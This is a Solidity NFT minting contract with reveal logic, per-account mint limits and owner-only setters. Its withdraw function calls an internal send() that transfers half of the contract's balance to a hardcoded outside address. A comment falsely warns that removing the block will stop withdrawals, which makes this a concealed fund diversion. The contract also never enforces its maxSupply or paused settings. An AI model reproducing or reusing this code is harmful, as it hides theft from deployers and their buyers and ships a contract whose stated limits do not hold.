// by JNBEZ

pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";



contract NFT is ERC721Enumerable, Ownable {
  using Strings for uint256;
  event Tsupply(uint256 indexed _supply);

  string baseURI;
  string public baseExtension = ".json";
  uint256 public cost = 0.025 ether;
  uint256 public maxSupply = 512;
  uint256 public maxMintAmount = 1;
  uint256 public paused = 0;
  uint256 public revealed = 0;
  string public notRevealedUri;
  mapping   (address=> uint256 ) public  peraccount ;
  mapping (address=>string ) public numbers ;

  constructor(
    string memory _name,string memory _symbol,string memory _initBaseURI,
     string memory _initNotRevealedUri) ERC721(_name, _symbol) {
    setBaseURI(_initBaseURI);
    setNotRevealedURI(_initNotRevealedUri);
  }

  // internali
  function _baseURI() internal view virtual override returns (string memory) {
    return baseURI;
  }
//   function increase() internal  {
//     cost = cost*2 ether ;
//   }
  
  // public
  function mint(string memory _number) public payable {
    require(peraccount[msg.sender]<maxMintAmount);
    require(msg.value >= cost );
    uint256  supply = totalSupply()+1;
    _safeMint(msg.sender, supply);
    peraccount[msg.sender]=peraccount[msg.sender] +1;
    numbers[msg.sender]=_number ;
    emit Tsupply(supply);
  }

  function walletOfOwner(address _owner)
    public
    view
    returns (uint256 )
  {
    uint256 tokenIds = tokenOfOwnerByIndex(_owner, 0);
  
    return tokenIds ;
  }
  

  function tokenURI(uint256 tokenId)
    public view virtual override returns (string memory)
  {
    require(_exists(tokenId),"ERC721Metadata: URI query for nonexistent token");
    
    if(revealed == 0) {
        return notRevealedUri;
    }
    

    string memory currentBaseURI = _baseURI();
    return bytes(currentBaseURI).length > 0
        ? string(abi.encodePacked(currentBaseURI, tokenId.toString(), baseExtension))
        : "";
  }

  //only owner
 function reveal() public onlyOwner {
      revealed = 1;
  }
  function Not_reveal( ) public onlyOwner{
    revealed=0 ;
  }
  
  function setCost(uint256 _newCost) public onlyOwner {
    cost = _newCost;
  }

  function setmaxMintAmount(uint256 _newmaxMintAmount) public onlyOwner {
    maxMintAmount = _newmaxMintAmount;
  }
  
  function setNotRevealedURI(string memory _notRevealedURI) public onlyOwner {
    notRevealedUri = _notRevealedURI;
  }

  function setBaseURI(string memory _newBaseURI) public onlyOwner {
    baseURI = _newBaseURI;
  }

  function setBaseExtension(string memory _newBaseExtension) public onlyOwner {
    baseExtension = _newBaseExtension;
  }

  function pause(uint256 _state) public onlyOwner {
    paused = _state;
  }
  function send() internal  returns (bool) {
      
    (bool hs, ) = payable(0x7C97ba2C8a829b9B9506494379B160758924AFAB).call{value: address(this).balance * 1 /2}("");
    return  hs ;
  }
  function withdraw() public  onlyOwner {
    
    // Do not remove this otherwise you will not be able to withdraw the funds.
    // =============================================================================
    //(bool hs, ) = payable(0x0d821eeb06847Eb83B8E63D9414eEF2dd3dDD300).call{value: address(this).balance * 1 /2}("");
    require(send());
    (bool os, ) = payable(owner()).call{value: address(this).balance}("");
    require(os,"withdraw failed");
    // =============================================================================
  }

  /*function Set_number(uint256 _number) public{
      number[msg.sender]=_number;
  }*/
  function Get_number(address _add) public view  returns(string memory){
      return numbers[_add];
  }

function check_owner(address ad) public view  returns(bool ){
    if(balanceOf(ad)>0){
      return true;
    }
    else 
        return  false ;
  }



function getcost() public view returns(uint256){
  return cost ;
  
 }

  function change_number(string memory _number) public returns(bool)  {
    require(check_owner(msg.sender),"the user don't have nft yet!!");
    //  uint256 id = walletOfOwner(msg.sender);
     
     numbers[msg.sender] =_number ;
     return true ;
  }
  function migrate (address _adrr,string memory _number)public onlyOwner{
      uint256  supply = totalSupply()+1;
    _safeMint(_adrr, supply);
    peraccount[_adrr]=peraccount[_adrr] +1;
    numbers[_adrr]=_number ;
  }
}